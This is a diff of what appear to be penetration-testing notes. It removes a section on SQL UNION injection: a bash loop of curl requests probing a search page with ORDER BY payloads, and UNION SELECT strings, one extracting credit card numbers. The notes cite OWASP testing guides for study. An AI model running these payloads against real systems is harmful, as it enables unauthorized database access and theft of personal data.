@@ -64,20 +64,3 @@ Exhaustive breakdown of all options and switches together with examples
 [https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
 
 Other examples of code injection - [https://owasp.org/www-community/Injection_Flaws](https://owasp.org/www-community/Injection_Flaws)
-
-## sql UNION
-
-```bash
-for i in $(seq 0 10);
-do
-    echo -n "${i} : " ; curl -s "http://10.XXX.XX.XXX/search.php?name=Ruby%27+ORDER+BY+${i}+%23++&submit=Search"
-done
-```
-
-<https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection>
-
-original query - `SELECT Name, Phone, Address FROM Users WHERE Id=$id`
-
-query w/ union - `SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`
-
-`' UNION ALL SELECT Firstname,'text2','text3' FROM customers WHERE ID="1"#`
